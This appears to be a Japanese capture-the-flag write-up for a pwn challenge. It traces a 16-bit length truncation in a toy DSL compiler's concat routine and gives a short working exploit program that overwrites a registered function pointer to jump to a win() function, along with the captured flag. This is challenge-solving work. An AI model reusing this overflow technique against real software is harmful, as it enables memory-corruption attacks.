# Easy 
## research
とりあえずhandoutで実行しているhandler.shを見る
```sh
if ! timeout "$COMPILE_TIMEOUT" "$CLANG" -O1 \
        -fpass-plugin=./compilerIBarelyKnowHer.so \
        -fstack-protector-strong -no-pie \
        -Wl,--section-start=.winsec=0x4010000 \
        prog.ll runtime.o -o prog 2> compile.log; then
    echo "== compile failed =="; head -c 4000 compile.log; exit 1
fi
```
0x4010000にある.winsecを呼べばいいらしい？？

```
Disassembly of section .winsec:

0000000000000000 <win>:
       0: 41 56                        	pushq	%r14
       2: 53                           	pushq	%rbx
       3: 48 81 ec 08 01 00 00         	subq	$0x108, %rsp            # imm = 0x108
       a: bf 00 00 00 00               	movl	$0x0, %edi
       f: be 00 00 00 00               	movl	$0x0, %esi
      14: e8 00 00 00 00               	callq	0x19 <win+0x19>
      19: 48 85 c0                     	testq	%rax, %rax
      1c: 0f 84 9e 00 00 00            	je	0xc0 <win+0xc0>
      22: 48 89 c3                     	movq	%rax, %rbx
      25: 48 8b 0d 00 00 00 00         	movq	(%rip), %rcx            # 0x2c <win+0x2c>
      2c: bf 00 00 00 00               	movl	$0x0, %edi
      31: be 14 00 00 00               	movl	$0x14, %esi
      36: ba 01 00 00 00               	movl	$0x1, %edx
      3b: e8 00 00 00 00               	callq	0x40 <win+0x40>
      40: 48 89 e7                     	movq	%rsp, %rdi
      43: be 01 00 00 00               	movl	$0x1, %esi
      48: ba 00 01 00 00               	movl	$0x100, %edx            # imm = 0x100
      4d: 48 89 d9                     	movq	%rbx, %rcx
      50: e8 00 00 00 00               	callq	0x55 <win+0x55>
      55: 48 85 c0                     	testq	%rax, %rax
      58: 74 37                        	je	0x91 <win+0x91>
      5a: 49 89 e6                     	movq	%rsp, %r14
      5d: 0f 1f 00                     	nopl	(%rax)
      60: 48 8b 0d 00 00 00 00         	movq	(%rip), %rcx            # 0x67 <win+0x67>
      67: be 01 00 00 00               	movl	$0x1, %esi
      6c: 4c 89 f7                     	movq	%r14, %rdi
      6f: 48 89 c2                     	movq	%rax, %rdx
      72: e8 00 00 00 00               	callq	0x77 <win+0x77>
      77: be 01 00 00 00               	movl	$0x1, %esi
      7c: ba 00 01 00 00               	movl	$0x100, %edx            # imm = 0x100
      81: 4c 89 f7                     	movq	%r14, %rdi
      84: 48 89 d9                     	movq	%rbx, %rcx
      87: e8 00 00 00 00               	callq	0x8c <win+0x8c>
      8c: 48 85 c0                     	testq	%rax, %rax
      8f: 75 cf                        	jne	0x60 <win+0x60>
      91: 48 8b 35 00 00 00 00         	movq	(%rip), %rsi            # 0x98 <win+0x98>
      98: bf 0a 00 00 00               	movl	$0xa, %edi
      9d: e8 00 00 00 00               	callq	0xa2 <win+0xa2>
      a2: 48 8b 3d 00 00 00 00         	movq	(%rip), %rdi            # 0xa9 <win+0xa9>
      a9: e8 00 00 00 00               	callq	0xae <win+0xae>
      ae: 48 89 df                     	movq	%rbx, %rdi
      b1: 48 81 c4 08 01 00 00         	addq	$0x108, %rsp            # imm = 0x108
      b8: 5b                           	popq	%rbx
      b9: 41 5e                        	popq	%r14
      bb: e9 00 00 00 00               	jmp	0xc0 <win+0xc0>
      c0: bf 00 00 00 00               	movl	$0x0, %edi
      c5: e8 00 00 00 00               	callq	0xca <win+0xca>
      ca: 48 8b 3d 00 00 00 00         	movq	(%rip), %rdi            # 0xd1 <win+0xd1>
      d1: 48 81 c4 08 01 00 00         	addq	$0x108, %rsp            # imm = 0x108
      d8: 5b                           	popq	%rbx
      d9: 41 5e                        	popq	%r14
      db: e9 00 00 00 00               	jmp	0xe0 <win+0xe0>
```

次に```== send your .dsl program, then a line containing only __EOF__ ==```の後に何をすえるかを読む

バイトチェックをしてprog.dslに書き込んで、runtime.oでコンパイルして実行するらしい

```
python3 "$DSLC" prog.dsl -o prog.ll
prog.ll runtime.o -o prog
./prog
```

とすると./progで0x4010000を読み込むようなprog.dslを書けばいいことになる

さらに、dslcをみる
```python
RUNTIME_DECLS = """\
; ---- runtime interface (runtime.o, compiled WITHOUT the plugin) ----
declare ptr  @rt_array_alloc(i64)
declare void @rt_array_setlen(ptr, i64)
declare void @rt_concat_copy(ptr, ptr, ptr, i64, i64)
declare void @rt_register(ptr)
declare void @rt_print(i64)
declare void @rt_oob()
declare void @rt_finish()
"""

def compile_src(src):
    fns, stmts = Parser(lex(src)).program()
    cg = CodeGen([Fn(f.name, f.params, f.body) for f in fns])
    pieces = ['target triple = "x86_64-pc-linux-gnu"', RUNTIME_DECLS]
    for f in fns:
        if f.name == "main": raise CompileError("'main' is reserved")
        pieces.append(cg.function(f.name, f.params, f.body, is_main=False))
    pieces.append(cg.function(None, [], stmts, is_main=True))
    return "\n\n".join(pieces) + "\n"
```

ここで、rt_registerとrt_finishを置いている

さらにruntime.oでそれぞれを見る
```bash
0000000000000180 <rt_register>:
     180: 53                           	pushq	%rbx
     181: 48 89 fb                     	movq	%rdi, %rbx
     184: 48 83 3d 00 00 00 00 00      	cmpq	$0x0, (%rip)            # 0x18c <rt_register+0xc>
     18c: 75 19                        	jne	0x1a7 <rt_register+0x27>
     18e: bf 10 00 00 00               	movl	$0x10, %edi
     193: e8 d8 fe ff ff               	callq	0x70 <arena_alloc>
     198: 48 89 05 00 00 00 00         	movq	%rax, (%rip)            # 0x19f <rt_register+0x1f>
     19f: 48 c7 40 08 34 12 00 00      	movq	$0x1234, 0x8(%rax)      # imm = 0x1234
     1a7: 48 8b 05 00 00 00 00         	movq	(%rip), %rax            # 0x1ae <rt_register+0x2e>
     1ae: 48 89 18                     	movq	%rbx, (%rax)
     1b1: 5b                           	popq	%rbx
     1b2: c3                           	retq
     1b3: 66 66 66 66 2e 0f 1f 84 00 00 00 00 00       	nopw	%cs:(%rax,%rax)

00000000000001c0 <rt_finish>:
     1c0: 48 8b 05 00 00 00 00         	movq	(%rip), %rax            # 0x1c7 <rt_finish+0x7>
     1c7: 48 85 c0                     	testq	%rax, %rax
     1ca: 74 0a                        	je	0x1d6 <rt_finish+0x16>
     1cc: 48 8b 00                     	movq	(%rax), %rax
     1cf: 48 85 c0                     	testq	%rax, %rax
     1d2: 74 02                        	je	0x1d6 <rt_finish+0x16>
     1d4: ff e0                        	jmpq	*%rax
     1d6: c3                           	retq
```

```bash
mov edi, 0x10
call arena_alloc
⇩
mov [rax+0x8], 0x1234
mov [rax], rbx
mov rax, [rip+...]  ; g_ctrl
test rax, rax
je end
⇩
mov rax, [rax]      ; 登録した関数のアドレス
test rax, rax
je end

jmp rax

end:
ret
```
この構造からrt_registerが登録したものを最後にrt_finishが呼び出すことになる

register(harmless);と呼べばharmlessが呼びだされる

ここで
```bash
fn harmless() {
    jmp 0x4010000;
}
```
と書いてみるがエラーして動かない

となるとオーバーフローしてここを書き換えてwinに書き換えればよさそう

## writeup
ここでoverflowを起こしそうなconcatやaddのような関数を探す

すると両方ある
```bash
def add(self):
        l = self.mul()
        while self.at("op") and self.peek().val in ("+","-"):
            op = self.next().val; l = Bin(op, l, self.mul())
        return l
```
```bash
def concat(self, a, b):
        la = self.t(); self.emit(f"  {la} = load i64, ptr {a}")
        lb = self.t(); self.emit(f"  {lb} = load i64, ptr {b}")
        la16 = self.t(); self.emit(f"  {la16} = trunc i64 {la} to i16")
        lb16 = self.t(); self.emit(f"  {lb16} = trunc i64 {lb} to i16")
        s = self.t(); self.emit(f"  {s} = add i16 {la16}, {lb16}")
        o = self.t(); self.emit(f"  {o} = icmp ult i16 {s}, {la16}")
        ok = self.L("ccok"); bad = self.L("ccof")
        self.emit(f"  br i1 {o}, label %{bad}, label %{ok}")
        self.emit(f"{bad}:"); self.emit("  call void @rt_oob()")
        self.emit("  unreachable"); self.emit(f"{ok}:")
        cap = self.t(); self.emit(f"  {cap} = zext i16 {s} to i64")
        total = self.t(); self.emit(f"  {total} = add i64 {la}, {lb}")
        c = self.t(); self.emit(f"  {c} = call ptr @rt_array_alloc(i64 {cap})")
        self.emit(f"  call void @rt_array_setlen(ptr {c}, i64 {total})")
        self.emit(f"  call void @rt_concat_copy(ptr {c}, ptr {a}, ptr {b}, "
                  f"i64 {cap}, i64 {la})")
        return (c, "ref")
```

concatは64bit管理なのに受け取るのは16bitらしい

65536を入れても0に見えるが計算後にそれより大きくとれてオーバーフローしそうである

そこに0x4010000を入れて呼び出せばいい

```bash
== send your .dsl program, then a line containing only __EOF__ ==
fn harmless() {
    return 0;
}

let a = array(65536);
let b = array(1);
let c = concat(a, b);

register(harmless);

c[1] = 0x4010000;
__EOF__


== running ==
win() called! flag: d4rk{s1gned_0r_Uns1gn3d??_676767}c0de

== exit 0 ==
```

## flag
```
flag: d4rk{s1gned_0r_Uns1gn3d??_676767}c0de
```